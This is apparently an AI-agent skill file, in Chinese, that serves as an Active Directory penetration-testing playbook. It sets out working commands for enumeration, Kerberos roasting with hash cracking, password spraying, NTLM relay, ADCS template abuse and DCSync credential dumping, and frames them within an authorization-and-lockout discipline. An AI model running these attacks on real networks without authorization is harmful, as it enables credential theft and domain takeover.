---
name: ad-attacks
description: AD 域渗透：域枚举（net/ldap/BloodHound）、AS-REP Roast、Kerberoasting、密码喷洒限速纪律、NTLM Relay 与 SMB 签名判定、ADCS 面概念、GPP 密码、DCSync 判定
whenToUse: 已落内网域环境（衔接 fscan/gogo 打点后）；域横向与提权阶段
role: internal
enabled: true
---

# AD 域渗透

## 一、域枚举（先摸清再动手）

```bash
# 当前上下文：是否域内、域控是谁
net config workstation | grep -i "域\|domain"; net time /domain
nltest /dsgetdc:<domain>            # DC 定位
net user /domain && net group /domain            # 用户/组清单
# LDAP 匿名（部分环境允许）
ldapsearch -x -H ldap://DC01.target.local -b "dc=target,dc=local" "(objectClass=user)" sAMAccountName memberOf
# BloodHound 采集（图形化路径分析，必跑）
SharpHound.exe -c All --zipfilename bh.zip          # 或 bloodhound-python -u x -p x -d target.local -c All
```

BloodHound 分析重点：Kerberoastable（SPN 用户）、AS-REP 可 roast 账户、到 Domain Admin 的最短路径、GPO 滥用边、ADCS 错配边。

## 二、离线凭据攻击（不碰锁出）

```bash
# AS-REP Roast（不需要密码的账户）
GetNPUsers.py target.local/ -usersfile users.txt -no-pass -dc-ip 10.0.0.1     # 命中出 $krb5asrep$ hash
hashcat -m 18200 asrep.hash wordlist.txt
# Kerberoasting（有 SPN 的服务账户）
GetUserSPNs.py target.local/u:Pass@DC01 -request -dc-ip 10.0.0.1              # $krb5tgs$ hash
hashcat -m 13100 kerb.hash wordlist.txt        # 服务账户口令常弱，规则挂常见后缀
# GPP 密码（老域策略遗留）
gpp-decrypt "$(ldapsearch 拿 Groups.xml 的 cpassword)"     # SYSVOL 下 \groups.xml
```

## 三、密码喷洒（限速铁律）

```bash
kerbrute passwordspray -d target.local users.txt 'Spring2026!' --delay 3000
```

- **一次只有 1-2 个候选口令 × 全量用户**，不要一个用户多口令（撞锁出阈值）
- 确认域策略 `net accounts /domain`（锁出阈值/观察窗口）后再定节奏；默认保守 3-5s/次
- 命中即停，不做全口令字典轮播

## 四、Relay 与 ADCS（面判定）

```bash
# SMB 签名（Relay 前置判定：不签名 = 可 relay）
nmap --script smb2-security-mode -p445 10.0.0.0/24        # Message signing enabled but not required = 可打
responder -I eth0                                          # 毒化抓 hash（授权环境）
ntlmrelayx.py -tf targets.txt -smb2support                 # relay 到不签名主机 / ADCS
# ADCS 面（错配即接管链，概念判定）：
certipy find -u u@target.local -p 'Pass' -dc-ip 10.0.0.1   # 枚举模板错配（ESC1-8：ENROLLEE_SUPPLIES_SUBJECT / 管理员批准缺失等）
```

ESC1 型（可指定 SAN 的错配模板）价值最高：申请 DC 证书 = 域管等价——判定到模板可申请即停，实际申请需授权。

## 五、DCSync 判定（终点动作）

```bash
# 拿到有 Replication 权限的凭据后（DCSync 权限判定）：
secretsdump.py target.local/u:'Pass'@DC01 -just-dc-ntlm     # 只取 NTLM 证明可复制即停
```

DCSync = 全域凭据面，属最高破坏等级：授权明确 + 目标可承受（域管通常可接受，生产 DC 注意复制流量告警）才执行；执行后立即评估是否需要重置触发。

## 纪律

- 域内每一步都按"枚举 → 只读判定 → 升级需授权"三段走；BloodHound 采集包含全员关系数据，落盘即敏感（加密存放、报告脱敏）
- 凭据类攻击（roast/spray）尊重锁出策略；命中凭据只用于继续只读枚举
- 回填：category=privesc/unauthorized（按动作），component=ActiveDirectory，engagement 必填

<!-- 改编自: S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet(MIT) + carlospolop/hacktricks active-directory-methodology(CC BY-NC-SA), 2026-10-31 -->
